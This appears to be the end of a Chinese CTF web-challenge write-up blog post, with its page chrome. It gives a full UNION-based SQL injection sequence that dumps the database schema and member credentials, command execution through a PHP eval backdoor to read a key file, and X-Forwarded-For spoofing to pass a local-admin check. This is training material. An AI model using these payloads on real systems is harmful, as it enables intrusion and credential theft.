+<p>测试注入<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=1</code><br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2</code><br>测试字段<br><code>http://219.153.49.228:40930/new_list.php?id=1 order by 4</code><br>测试显示字段<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2 union select 1,2,3,4</code><br>查询当前数据库和版本<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2 union select 1,database(),version(),4</code><br>爆库<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 0,1</code></p>
+<p>爆表<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_StormGroup&#39; limit 0,1</code><br>爆字段<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2 union select 1,column_name,column_type,4 from information_schema.columns where table_schema=&#39;mozhe_Discuz_StormGroup&#39; and table_name=&#39;StormGroup_member&#39; limit 0,1</code></p>
+<p>爆明文<br><code>http://219.153.49.228:40930/new_list.php?id=1 and 1=2 union select 1,concat(name,&#39;-&#39;,password,&#39;-&#39;,status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1</code></p>
+<p>md5解密status为1的明文，登录拿到flag</p>
+<p>表StormGroup_member,notice</p>
+<p>数据库mozhe_Discuz_StormGroup</p>
+<h1 id="php代码分析溯源"><a href="#php代码分析溯源" class="headerlink" title="php代码分析溯源"></a>php代码分析溯源</h1><p>ob_start()打开输出缓冲，输出内容在内部缓冲区<br>ob_get_contents()缓冲区内容复制到字符串变量<br>ob_get_clean()得到当前缓冲区的内容并删除当前缓冲区，返回FALSE<br>ob_end_flush()输出内容<br>ob_end_clean()丢弃内容<br>strpos查找字符串在另一字符串出现的位置</p>
+<p>eval换成echo输出，解密代码为<br>    echo <code>$_REQUEST[a]</code>;; ?&gt;<br>Linux命令： a=ls列出所有目录，发现key_70613202421270.php</p>
+<p>cat命令：连接文件打印到标准输出设备。<br>tac命令: 文件内容反过来显示。<br><code>cat a=key_70613202421270.php</code>查看源码获得KEY </p>
+<h1 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h1><p>查看源码<br>存在base64加密，解密后得到test123<br>admin登陆访问。<br>根据提示本地管理员，伪装本地访问<br>Burp抓包，</p>
+<p>$_SERVER(‘REMOTE_ADDR’)获取IP是Web服务器TCP连接的IP</p>
+<p>X-Forwarded-For: client.proxy1,proxy2.<br>最后一个代理不加入，通过上述$_SERVER(‘REMOTE_ADDR’)获取。</p>
+<p>用X-Forwarded-For伪装IP</p>
+<p>代理包含正向代理，透明代理，反向代理。</p>
+<p>加上X-Forwarded-For:127.0.0.1 本地访问</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="王嘉熙 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="王嘉熙 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/06/24/微机原理实验代码/" rel="next" title="微机实验代码">
+                <i class="fa fa-chevron-left"></i> 微机实验代码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/07/08/黑客游戏/" rel="prev" title="黑客游戏闯关">
+                黑客游戏闯关 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="王嘉熙" />
+            
+              <p class="site-author-name" itemprop="name">王嘉熙</p>
+              <p class="site-description motion-element" itemprop="description">Nothing is impossible</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/08163182" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wjx15896427883@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/Jason_wang9527" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://instagram.com/jason_wang9527" target="_blank" title="Instagram">
+                      
+                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php与mysql"><span class="nav-number">1.</span> <span class="nav-text">php与mysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#面向对象与面向过程"><span class="nav-number">2.</span> <span class="nav-text">面向对象与面向过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ox前言："><span class="nav-number">3.</span> <span class="nav-text">ox前言：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#标注"><span class="nav-number">4.</span> <span class="nav-text">标注</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql知识"><span class="nav-number">5.</span> <span class="nav-text">sql知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson-1"><span class="nav-number">6.</span> <span class="nav-text">lesson-1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson2"><span class="nav-number">7.</span> <span class="nav-text">lesson2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson3"><span class="nav-number">8.</span> <span class="nav-text">lesson3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson4"><span class="nav-number">9.</span> <span class="nav-text">lesson4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson5"><span class="nav-number">10.</span> <span class="nav-text">lesson5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson6"><span class="nav-number">11.</span> <span class="nav-text">lesson6</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#lesson7"><span class="nav-number">12.</span> <span class="nav-text">lesson7</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入常见问题"><span class="nav-number">13.</span> <span class="nav-text">sql注入常见问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域名解析"><span class="nav-number">14.</span> <span class="nav-text">域名解析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag在index中"><span class="nav-number">15.</span> <span class="nav-text">flag在index中</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php黑魔法"><span class="nav-number">16.</span> <span class="nav-text">php黑魔法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Refer作用"><span class="nav-number">16.1.</span> <span class="nav-text">Refer作用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#备份文件是个好习惯"><span class="nav-number">17.</span> <span class="nav-text">备份文件是个好习惯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#秋名山老司机"><span class="nav-number">18.</span> <span class="nav-text">秋名山老司机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss"><span class="nav-number">19.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#never-giver-up"><span class="nav-number">20.</span> <span class="nav-text">never giver up</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#过狗一句话"><span class="nav-number">21.</span> <span class="nav-text">过狗一句话</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#字符？正则"><span class="nav-number">22.</span> <span class="nav-text">字符？正则</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#login1"><span class="nav-number">23.</span> <span class="nav-text">login1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#你从哪里来"><span class="nav-number">24.</span> <span class="nav-text">你从哪里来</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#md5-collection"><span class="nav-number">25.</span> <span class="nav-text">md5 collection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#程序员本地网站"><span class="nav-number">26.</span> <span class="nav-text">程序员本地网站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#各种绕过"><span class="nav-number">27.</span> <span class="nav-text">各种绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP函数学习"><span class="nav-number">28.</span> <span class="nav-text">PHP函数学习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web8"><span class="nav-number">29.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#考细心"><span class="nav-number">30.</span> <span class="nav-text">考细心</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#得到getshall"><span class="nav-number">31.</span> <span class="nav-text">得到getshall</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#本地包含"><span class="nav-number">32.</span> <span class="nav-text">本地包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网站被黑"><span class="nav-number">33.</span> <span class="nav-text">网站被黑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Welcome-to-BugkuCTF"><span class="nav-number">34.</span> <span class="nav-text">Welcome to BugkuCTF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#成绩单查询"><span class="nav-number">35.</span> <span class="nav-text">成绩单查询</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#我感觉你得快点"><span class="nav-number">36.</span> <span class="nav-text">我感觉你得快点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#求getshell"><span class="nav-number">37.</span> <span class="nav-text">求getshell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Insert-Into注入"><span class="nav-number">38.</span> <span class="nav-text">Insert Into注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#多次"><span class="nav-number">39.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#孙xx的博客"><span class="nav-number">40.</span> <span class="nav-text">孙xx的博客</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag-php"><span class="nav-number">41.</span> <span class="nav-text">flag.php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含"><span class="nav-number">42.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trim的日记本"><span class="nav-number">43.</span> <span class="nav-text">Trim的日记本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#welcome-to-the-bugkuctf"><span class="nav-number">44.</span> <span class="nav-text">welcome to the bugkuctf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入"><span class="nav-number">45.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php代码分析溯源"><span class="nav-number">46.</span> <span class="nav-text">php代码分析溯源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#管理员系统"><span class="nav-number">47.</span> <span class="nav-text">管理员系统</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">王嘉熙</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4
+<span>   |   </span>
+<span id="showDays"></span>
+</div>
+
+
+
+
+<script>
+  var seconds = 1000;
+  var minutes = seconds * 60;
+  var hours = minutes * 60;
+  var days = hours * 24;
+  var years = days * 365;
+  var birthDay = Date.UTC(2018,02,10,00,00,00); // 这里设置建站时间
+  setInterval(function() {
+    var today = new Date();
+    var todayYear = today.getFullYear();
+    var todayMonth = today.getMonth()+1;
+    var todayDate = today.getDate();
+    var todayHour = today.getHours();
+    var todayMinute = today.getMinutes();
+    var todaySecond = today.getSeconds();
+    var now = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+    var diff = now - birthDay;
+    var diffYears = Math.floor(diff/years);
+    var diffDays = Math.floor((diff/days)-diffYears*365);
+    var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+    var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+    var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+      document.getElementById('showDays').innerHTML="博客已运行 "+diffYears+" 年 "+diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+  }, 1000);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("s8OK1yas4CmWRhxmuW1FJq2Q-gzGzoHsz", "uY78z9PJL2vdt76Nv08OYE3R");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+
+<!-- 页面点击小心心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.12.0/styles/atom-one-dark.min.css">
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script type="text/javascript">
+  $(function() {
+    hljs.initHighlighting();
+    $('pre code').each(function() {
+      var lines = $(this).text().split('\n').length - 1;
+      var $numbering = $('<ul/>').addClass('pre-numbering');
+      $(this)
+        .addClass('has-numbering')
+        .parent()
+        .append($numbering);
+      for (i = 1; i <= lines; i++) {
+        $numbering.append($('<li/>'));
+      }
+    });
+  });
+
+</script>
+
+<style>
+  pre {
+    position: relative;
+    padding: 0;
+  }
+
+  code.has-numbering {
+    margin-left: 2.5rem;
+  }
+
+  code.has-numbering::-webkit-scrollbar {
+    display: none;
+  }
+
+  .pre-numbering {
+    margin: 0;
+    position: absolute;
+    top: 0;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    height: 100%;
+  }
+
+  .pre-numbering li {
+    list-style-type: decimal-leading-zero !important;
+  }
+
+  @media (max-width: 760px) {
+    .post-body pre {
+      padding: 0px;
+    }
+
+    .post-body .pre-numbering {
+      display: none;
+    }
+
+    code.has-numbering {
+      margin: 0;
+    }
+  }
+
+</style>
+
+</html>
